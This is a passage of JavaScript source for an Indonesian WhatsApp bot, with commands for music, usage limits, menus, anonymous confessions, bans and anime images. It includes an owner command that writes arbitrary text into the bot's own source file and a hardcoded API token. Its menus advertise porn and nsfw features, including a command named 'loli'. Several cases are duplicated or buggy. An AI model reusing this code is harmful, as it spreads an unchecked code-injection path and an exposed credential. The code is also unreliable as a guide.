console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Ditss, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber, nomore, qkontak, asumaSaldo, ditsganteng, prefix, reply, text, pickRandom, readmore, fetchJson, salam, totalfitur, ppuser, fsaluran, makeid}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "play2": {
if (!text) return m.reply(example("dj tiktok"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363391204793452@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${res.title}`,
newsletterJid: "120363391204793452@newsletter"}
}},{quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
//D|ts si pler 🐎
break 
        //wm dits
        

			case 'addlimit':
			case 'givelimit': {

				if (!isCreator) return Reply(mess.owner);
				if (!text) return Reply(`Usage: ${prefix + command} number|limit amount`);
              const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
				usernya = text.split('|')[0];
				limitnya = text.split('|')[1];
				let oo = `${usernya}@s.whatsapp.net`;
				db.users[oo].limit += limitnya;
				Reply('Limit berhasil ditambahkan!');
			}
			break;

			case 'dellimit': {
				if (!isCreator) return Reply(mess.owner);
				if (!text) return Reply(`Usage: ${prefix + command} number|limit amount`);
				usernya = text.split('|')[0];
				limitnya = text.split('|')[1];
				if (db.users[usernya + '@s.whatsapp.net'].limit < limitnya) return Reply(`Limit dia kurang dari ${limitnya}`);
				db.users[usernya + '@s.whatsapp.net'].limit -= limitnya;
				Reply('Limit berhasil dikurangi!!');
			}
			break;



case 'ceklimit':
if (!froms) return Reply(`Mau cek limit siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return Reply(`Ups, Limit ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return Reply('User tidak terdaftar didalam database!')
if (froms == sender) return Reply('Ketik aja saldo lah')
Reply(`*INFO LIMIT DARI*\n\nTarget Cek : ${Ditss.getName(froms)}\nLimit : ${db.users[froms].limit}\nNomor : ${froms.split('@')[0]}`)
break



case 'limit':{
const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
Reply(`*INFO LIMIT ANDA*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Limit : ${ki}${db.users[m.sender].limit}${ki}
 • Tanggal : ${calender}
 
Note : limit akan di reset pada jam 00:00`)
}
break

case 'addcase': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Mana case nya tuan..');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = './case.js';



// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n\n' + caseBaru + '\n\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                m.reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                Reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        Reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break

        //pp
        case 'wallpaper2':
case 'wallpaper': {
//if (cek("id", m.sender) == null) return reply(mess.notregist)

if (!text) return reply(`Use example ${prefix}${command} Minecrafte`)
const res = await (/2/.test(command) ? wallpaperv2 : wallpaper)(text)
const img = res[Math.floor(Math.random() * res.length)]
Ditss.sendFile(m.chat, img, 'wallpaper.jpg', `Result from *${text}*`, m)
}
//D|ts si pler 🐎
break 
        //momoek
        case "toples4": 
        let mok = `${m.sender}`
const xtexg = `
@${global.owner}
ʜᴀʟᴏ @${m.sender.split("@")[0]} *${salam}* , ɪɴɪ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡᴀ ꜱᴀʏᴀ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ ʏᴀɴɢ ᴅɪ ꜱᴇᴅɪᴀᴋᴀɴ ᴅᴇᴠ, ᴅᴇɴɢᴀɴ ʜᴀɴʏᴀ ᴍᴇɴɢᴇᴛɪᴋ.

┌  ◦ ʟɪꜱᴛᴍᴇɴᴜ
╰  ◦ ᴀʟʟᴍᴇɴᴜ`
Ditss.sendMessage(m.chat, {
    document: fs.readFileSync("./package.json"),
    fileName: global.botname,
    mimetype: 'application/msword',
    jpegThumbnail: fs.readFileSync("./source/media/dits-pler.jpg"), 
    contextInfo: {
  mentionedJid: [global.owner+"@s.whatsapp.net", m.sender], 
        isForwarded: true,
        /*forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            serverMessageId: null,
            newsletterName: global.nems
        },*/
    },
    caption: xtexg,
  footer: global.namaOwner2,
  buttons:  [
  {
    buttonId: `${prefix}listmon`,
    buttonText: { displayText: 'List Menu' }
  },
  {
    buttonId: `${prefix}allmon`,
    buttonText: { displayText: 'All Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {quoted:fsaluran})
        
//D|ts si pler 🐎
break 
        //++
        case "jadibot":
 if (!isPremium) return 
Ditss.sendPoll(m, "*`[ Pilih Methode ]`*", [`jadibot-scan`,`jadibot-pairing ${m.sender.replace("@s.whatsapp.net")}`])      
//D|ts si pler 🐎
break 
        //=========
       case"menu-populer":{
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 MENU - POPULER 乂\`*
> ┌  ◦ *brat* : 
> └  ◦ *faketweet* :
> ┌  ◦ *emojimix* : 
> └  ◦ *bokep* :
> ┌  ◦ *twt* : 
> └  ◦ *tt* :
> ┌  ◦ *s* : 
> └  ◦ *qc* :
> ┌  ◦ *ig* : 
> └  ◦ *galau* :
> ┌  ◦ *bratgen* : 
> └  ◦ *play* :
> ┌  ◦ *gamemenu* : 
> └  ◦ *chat* :
> ┌  ◦ *upch* : 
> └  ◦ *ytmp3* :
> ┌  ◦ *ytmp4* : 
> └  ◦ *tts* :
> ┌  ◦ *yts* : 
> └  ◦ *ai* :
`, 
  footer: `powered by ${namaOwner2}`,
  buttons: [
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'speed bot'
    },
    type: 1,
  },
  {
    buttonId: '.sc',
    buttonText: {
      displayText: 'script bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'menu populer',
            highlight_label: '',
            rows: [
              {
                header: 'tampilkan menu list',
                title: '',
                description: '',
                id: '.asuma-list',
              },
              {
                header: 'tampilkan semua menu',
                title: '',
                description: '',
                id: '.allplerr',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break 
        //=========
    case"sc":case"infobot": case "inpoebot":{
Ditss.sendMessage(m.chat, {
  location: {
    degreesLatitude: -6.2088, // Ganti dengan latitude lokasi
    degreesLongitude: 106.8456, // Ganti dengan longitude lokasi
  },
  caption: `*\`乂 INFO/SC - BOT 乂\`*
> nameown : ${global.namaOwner}
> namebot : ${global.botname2}
> versi : ${global.versi}
> tipe : case X plugins 
> total pengguna : ${Object.keys(db.users).length}
> total fitur : ${totalfitur}
> get script di https://whatsapp.com/channel/0029Vb7LVEnHltYCWuCFAt0y
`,
  footer: "©copyright by Hikaa",
  buttons: [
          { buttonId: `.menu`,
          buttonText: {
          displayText: 'back menu awal'
          },
           type: 1 }
          ], // isi buttons nya
  headerType: 6,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break 
        //=========
      case 'spotify': {
				if (!text) return m.reply(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} Juice Wrld`)
				Ditss.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
				try {
					let anu = await searchSpotifyTracks(text)
					let anuu = anu[0]
					let spotify = await spotifyDl(anuu.external_urls.spotify)
					await Ditss.sendMessage(m.chat, {
						audio: {
							url: spotify.result.music
						},
						mimetype: 'audio/mpeg',
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: "乂 Spotify - Player",
								body: `${spotify.result.author} - ${spotify.result.title} © ${botname2}`,
								mediaType: 1,
								previewType: 0,
								renderLargerThumbnail: true,
								thumbnailUrl: spotify.result.thumb,
								sourceUrl: anuu.external_urls.spotify
							}
						}
					}, {
						quoted: m
					})
				} catch (error) {
			//		await m.errorReport(util.format(error), command)
				}
			}
			//D|ts si pler 🐎
break 
        //=========
        case 'asuma-list':
			case 'menu-list':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Ditss.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "terlaris✓",
 rows: [{
 header: 'Menu Populer🐣',
 title: "menampilkan menu populer",
 description: `yang banyak orang cari dan banyak orang pake`,
 id: `.menu-populer`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Group🐣',
 title: "menampilkan menu group",
 description: `.`,
 id: `.asuma-group`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu ai🐣',
 title: "menampilkan menu ai",
 description: `yang cepet dan canggih`,
 id: `.asuma-ai`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Game🐣',
 title: "Menampilkan Menu Game",
 description: `yang seru dan tidak membosankan.`,
 id: `.asuma-game`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Menu Rpg🐣',
 title: "Menampilkan Menu Rpg",
 description: `menu rpg sedang kosong`,
 id: `.asuma-rpg`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Download',
 title: "menampilkan menu download",
 description: `yang cepat dan canggih`,
 id: `.asuma-download`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Menu Tools🐣',
  
 title: "Menampilkan menu tools",
 description: ``,
 id: `.asuma-tools`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Owner🐣',
 title: "User Tidak Bisa Akses",
 description: ``,
 id: `.asuma-owner`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Absen🐣',
 title: "Menampilkan Menu Absen",
 description: ``,
 id: `.asuma-absen`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Cerpen🐣',
 title: "Menampilkan menu Cerpen",
 description: `cocok buat yang sering baca.`,
 id: `.asuma-cerpen`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Beritaa🐣',
 title: "menampilkan menu berita yang viral.",
 description: ``,
 id: `.asuma-berita`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Sound🐣',
 title: "Menampilkan Menu Sound",
 description: `cocok yang sering dengerin muasik.`,
 id: `.asuma-sound`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Anime🐣',
 title: "Menampilkan menu Anime",
 description: `cocok buat wibu/karbit.`,
 id: `.asuma-anime`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu photo🐣',
 title: "menampilkan menu photo ramdom",
 description: `.`,
 id: `.asuma-photo`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu islam🐣',
 title: "menampilkan menu islam",
 description: `cocok yang mau belajar doa sholat/bacaan surah`,
 id: `.asuma-islam`

 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Random🐣',
 title: "menampilkan menu random",
 description: ``,
 id: `.asuma-random`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu nsfw🐣',
 title: "menampilkan menu nsfw",
 description: `menu terlarang 🗿`,
 id: `.asuma-nsfw`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Share🐣',
 title: "menampilkan Menu share",
 description: `yang canggih dan cepatt.`,
 id: `.asuma-share`
 },{
 header: '😈Owner😈',
 title: "Nomor Owner Botz",
 description: ``,
 id: `.owner`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "Menu List",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//D|ts si pler 🐎
break 
        //=========
        			case 'tourl': {
				if (!mime) return Reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`);
				await emote('⏱️');
				try {
					let media = await Ditss.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Link Media* : ${response}\n📅 *Tanggal Upload* : ${uploadDate}\n📂 *Ukuran File* : ${fileSize} KB\n👤 *Pengunggah* : ${uploader}`.trim();
						reply(caption);
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						reply(response);
					} else {
					Reply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					Reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			//D|ts si pler 🐎
break ;
        //=========
			case 'play':
			case 'ytplay': {
if (!text) return m.reply(example("adit berak di celana"))
await Ditss.sendMessage(`${global.idSaluran}`, {react: {text: '🔎', key: m.key}})
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
				const caption = `${rees.title}\n${rees.url}`;
				Ditss.sendMessage(m.chat,{
			        image: {url:rees.thumbnail},
                   //thumbnailUrl: rees.thumbnail,
                   //renderLargerThumbnail: true,
					caption: caption,
					footer: `Author ${rees.author.name} || Duration ${rees.timestamp}\n${botname2}`,
					buttons: [
						{
							buttonId: `.ytmp4 ${rees.url}`,
							buttonText: {
								displayText: "get video"
							}
						},
						{
							buttonId: `.ytmp3 ${rees.url}`,
							buttonText: {
								displayText: "get audio"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			//D|ts si pler 🐎
break 
        case "nontontv":
{

let teksk = `PILIH POLLING BERIKUT

dibawah adalah list dari channel top di televisi
pilih polling dari channel yang ingin di tonton
setelah itu bot akan memberi channel yang ingin
anda tonton dengan berupa link`
Ditss.sendPoll(from, teksk, ['TVINTERNASIONAL','GLOBALTV','MNCTV','RCTI','TRANSTV','TRANS7','ANTV','SCTV','NET','INDOSIAR'])
}
//D|ts si pler 🐎
break 
        //============
       case "toes":{
    if (!text) return m.reply('Mana fitur nya tuan...');
const mmkBaru = `${text}`;
Ditss.sendMessage(`${global.idSaluran}`, {
	text: "kamue mana bise buet beginii🗿",
	footer: "wihhh",
	buttons: [
		{
			buttonId: "#1",
			buttonText: {
				displayText: "ahh"
			},
			type: 1
		},
		{
			buttonId: "#2",
			buttonText: {
				displayText: "ahh"
			},
			type: 1
		},
		{
			buttonId: "listbtns",
			buttonText: {
				displayText: "ih nak lahh"
			},
			nativeFlowInfo: {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${mmkBaru}\"}`
			},
			type: 2
		},
		{
			buttonId: "btns",
			buttonText: {
				displayText: "..."
			},
			nativeFlowInfo: {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${mmkBaru}\"}`
			},
		}
	],
	headerType: 1,
	viewOnce: true
});
}
//D|ts si pler 🐎
break 
       //===========
   case 'galau':{

const caption = `.`;
let heyy
if (/galau/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/video-random')
let plerkuda = heyy[Math.floor(Math.random() * heyy.length)]

				Ditss.sendMessage(m.chat,{
			 video: {url:plerkuda},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.toaudio`,

							buttonText: {
								displayText: "back sound"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
        			db.users[m.sender].limit -= 1;
			break
//================================================================================


case 'autoai':{
Ditss.simi = Ditss.simi ? Ditss.simi : {};

 if (!text) return Reply(`*Contoh:* .autoai *[on/off]*`);

 if (text === "on") {
 Ditss.simi[sender] = {
 messages: []
 };
 m.reply(`[ ✓ ] sukses mode*\`asuma ai\`* : ᴀᴋᴛɪғ`);
 } else if (text === "off") {
 delete Ditss.simi[sender];
 m.reply(`[ ✓ ] sukses mode *\`asuma\`* : ɴᴏɴᴀᴋᴛɪғ`);
 }
};
//D|ts si pler 🐎
break 

case "upteks":
case "chat":{
if (!global.kirsan && !isCreator && !isPremium) return replyAi(`token abis, tunggu saja beberapa jam, atau chat owner`) 
 if (!text) return m.reply("contoh\n.chat selamat siang semuanya")
/*var arr = [
"🌑",
"🌘",
"🌗",
"🌖",
"🌕",
"🌖",
"🌗",
"🌘",
"🐣"
]
let load = await Ditss.sendMessage(from, {text: '🐣'},{quoted:fcall})
for (let i = 0; i < arr.length; i++) {
await sleep(100)
await Ditss.sendMessage(from, {text: arr[i], edit: load.key },{quoted:fcall});
}*/

 const Kalender00011 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
 const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
await Ditss.sendMessage(m.chat, {
 react: {
 text: '🦚',
 key: m.key,
 }})
Ditss.sendMessage(`${global.idch}`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `asuma md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `pesan dari: ${pushname}`,
 body: `fRoM: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
Ditss.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})
 reply(`sukses mengirim pesan ke channel.`)
 Ditss.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})

}
db.users[m.sender].limit -= 50;
await m.reply(`-50☠️ limit terpakai✓ sisa limit ${db.users[m.sender].limit}`)
break 



case"upch":
case 'upsaluran':{
if (!text) return m.reply("reply audio\ncontoh: .upch (wm nya)")
Ditss.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
Ditss.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
Ditss.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363391204793452@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${text}`,
newsletterJid: "120363391204793452@newsletter"}
}},{quoted: m})
await sleep(2000)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
m.reply(`mengirim audio ke channel berhasil`)
}
db.users[m.sender].limit -= 20;
await m.reply(`-20⚡ limit terpakai✓ sisa limit ${db.users[m.sender].limit}`)
break 

case 'logic2': case 'ailogic':{
 if (!text) {
 return m.reply(`Tidak Ada Pertanyaan, Perintah Di Batalkan`)
 }
 try {
 const aiResponse = await Selxyzz.chat({
 model: "sxyz-20-B",
 token: "2520a2Ut2cSSB98BSiFuq0ELtcrDHTN4GVaxZQ61", 
 content: text
 });

 await m.reply(aiResponse);
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
}
//D|ts si pler 🐎
break 

case"confes": case "menfes":case 'menfess': case 'confess': {
if (m.isGroup) return reply(`Khusus Di Private Chat!!`)
      global.db.menfess = global.db.menfess ? global.db.menfess : {}
      if (!text) return Reply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let [jid, name, msg] = text.split`|`
      if ((!jid || !name || !msg)) return reply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let p = (await Ditss.onWhatsApp(jid))[0] || {}
      if (!p.exists) return reply('❌ Nomer Yang Kamu Masukan Salah')
      if (p.jid == m.sender) return reply('Itu Nomer Lu Dodol!!')
      let mf = Object.values(global.db.menfess).find(mf => mf.status === true)
      if (mf) return !0
         let heri = `${monospa(`${name.trim()}`)}`
         let id = +new Date
         let txt = `📨 Hay kamu dapat pesan dari seseorang 👋 \n\nnama: *${name.trim()}*\n\nPesan: `
         txt += `_${msg.trim()}_\n\n${readmore}Mau balas pesan ini kak? bisa kok kak. tinggal ketik pesannya kakak lalu kirim, nanti saya sampaikan ke ${heri}`
         
             await Ditss.sendMessage(p.jid, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        title: 'Confess',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/5413eed27c6af00fa7273.jpg',
        sourceUrl: `${global.linkSaluran}`,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }).then(() => {
 m.reply(`*Berhasil Mengirim Pesan Menfess!!*`)       
            global.db.menfess[id] = {
               id,
               from: m.sender,
               name,
               receiver: p.jid,
               msg,
               status: false
            }
            return !0
         })
   }
   //D|ts si pler 🐎
break 




case 'banned': case 'ban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return m.reply('User tidak terdaftar didalam DATABASE!')
if (db.users[froms].banned) return reply('Udah banned!')
db.users[froms].banned = true
m.reply(`Berhasil banned *${db.users[froms].name}*`)
} else m.reply('tag atau reply pesan target!')
//D|ts si pler 🐎
break 

case 'unbanned': case 'unban':
if (!isCreator) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('Tag atau reply pesan target!')
break

case 'unbanned': case 'unban':
if (!isCreator) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('tag atau reply pesan target! bloon ni anak🗿')
break

case 'listdbuser':
if (!isCreator) return reply(mess.owner)
let listdbuser = Object.entries(db.users).map(([key, value]) => {return {...value, jid: key}})
let sortedbalance1 = listdbuser.map(toNumber('limit')).sort(sort('limit'))
let usersbalance1 = sortedbalance1.map(enumGetKey)
ppo = `Kamu Top *${usersbalance1.indexOf(sender) + 1}* Limit dari *${usersbalance1.length}* global user

${sortedbalance1.slice(0, 10).map(({ jid, balance }, i) => `${i + 1}. @${jid.split('@')[0]} => ${formatNumber(limit)}`).join`\n`}`
reply(ppo)
break

case 'mulaiabsen': {
if (!isGroup) return reply('Hanya Di Group')
 const chatId = m.chat; 
 

 
 if (absenData[chatId]) {
 reply ('Absen sudah dimulai di obrolan ini!');
 }

 
 absenData[chatId] = {
 admin: userId, 
 participants: [], 
 };

 
 m.reply('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
//D|ts si pler 🐎
break ;

        case 'wallpaper2':
case 'wallpaper': {
if (!text) return reply(`Use example ${prefix}${command} Minecraft`)
const res = await (/2/.test(command) ? wallpaperv2 : wallpaper)(text)
const img = res[Math.floor(Math.random() * res.length)]
//bangzyeekull.sendFile(m.chat, img, 'wallpaper.jpg', `Result from *${text}*`, m)
await Ditss.sendMessage(m.chat,{
			 image: img,
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: fsaluran
				});
}
//D|ts si pler 🐎
break 


case 'absen': {
if (!isGroup) return reply('Hanya Di Group')
 const chatId = m.chat; 
 
 
 if (!absenData[chatId]) {
 m.reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
 }
 var vsbhsbbeheheh = Ditss.getName(m.sender)
 absenData[chatId].participants.push(vsbhsbbeheheh);

 m.reply('Anda telah berhasil bergabung dalam proses absen!');
}
//D|ts si pler 🐎
break ;
case 'loli': {
let baseUrl = 'https://weeb-api.vercel.app/'
const response = await fetch(baseUrl + command)
const imageBuffer = await response.buffer()
//Ditss.sendMessage(m.chat, {image:imageBuffer, caption: mess.done}, {quoted: m})
await Ditss.sendMessage(m.chat,{
			 image: imageBuffer,
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
//D|ts si pler 🐎
break 

case 'waifu': {
let baseUrl = 'https://weeb-api.vercel.app/'
const response = await fetch(baseUrl + command)
const imageBuffer = await response.buffer()
//Ditss.sendMessage(m.chat, {image:imageBuffer, caption: mess.done}, {quoted: m})
await Ditss.sendMessage(m.chat,{
			 image: imageBuffer,
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
//D|ts si pler 🐎
break 

case 'neko': {
let baseUrl = 'https://weeb-api.vercel.app/'
const response = await fetch(baseUrl + command)
const imageBuffer = await response.buffer()
//Ditss.sendMessage(m.chat, {image:imageBuffer, caption: mess.done}, {quoted: m})
await Ditss.sendMessage(m.chat,{
			 image: imageBuffer,
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done ${text}`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
//D|ts si pler 🐎
break 

case 'cekabsen': {
if (!isGroup) return reply('Hanya Di Group')
 const chatId = m.chat;
 
 
 if (!absenData[chatId]) {
 reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
 }

 
 const participants = absenData[chatId].participants;
 
 m.reply(`Daftar peserta absen:\n${participants.join(', ')}`);
}
//D|ts si pler 🐎
break ;

case 'hapusabsen': {
if (!isGroup) return reply('Hanya Di Group')
 
 const chatId = m.chat;
 if (absenData[chatId] && absenData[chatId].admin === m.sender) {
 
 delete absenData[chatId];
 
 m.reply('Proses absen telah dihapus!');
 } else {
 reply('Anda tidak memiliki izin untuk menghapus proses absen!');
 }
}
//D|ts si pler 🐎
break 



case 'joko':{
 if (!text) {
 return m.reply("Tidak ada pembicaraan yang ditemukan.");
 }

 try {
 const response = await axios.get("https://api.siputzx.my.id/api/ai/joko?content=" + text);
 const audioUrl = `https://api.siputzx.my.id/api/tools/tts?voice=jv-ID-DimasNeural&rate=0&pitch=0&volume=0&text=${response.data.data}`;
 await Ditss.sendMessage(m.chat, { mimetype: 'audio/mp4', audio: { url: audioUrl } }, { quoted: m });
 } catch (error) {
 //m.reply("Terjadi kesalahan saat memproses permintaan.");
 }
 }
 //D|ts si pler 🐎
break 



case 'latukam':{
